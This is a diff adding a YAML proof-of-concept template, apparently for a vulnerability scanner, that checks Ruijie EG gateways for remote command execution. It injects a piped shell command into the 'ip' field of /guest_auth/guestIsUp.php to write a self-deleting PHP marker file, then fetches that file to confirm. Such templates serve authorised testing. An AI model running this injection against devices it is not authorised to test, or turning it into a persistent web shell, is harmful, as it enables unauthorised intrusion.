@@ -1,0 +1,29 @@
+name: poc-yaml-ruijie-eg-rce
+set:
+  r1: randomLowercase(4)
+  r2: randomLowercase(4)
+  phpcode: >
+    "<?php echo '" + r1 + "'; unlink(__FILE__); ?>"
+  payload: base64(phpcode)
+rules:
+  - method: POST
+    path: "/guest_auth/guestIsUp.php"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
+      Accept-Encoding: "gzip, deflate"
+      Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
+    body: |
+      ip=127.0.0.1|echo '{{payload}}' | base64 -d > {{r2}}.php&mac=00-00
+    expression: |
+      response.status == 200
+  - method: GET
+    path: "/guest_auth/{{r2}}.php"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
+      Accept-Encoding: "gzip, deflate"
+    expression: |
+      response.body.bcontains(bytes(r1))
+detail:
+  author: White(https://github.com/WhiteHSBG)
+  links:
+    - https://xz.aliyun.com/t/9016?page=1
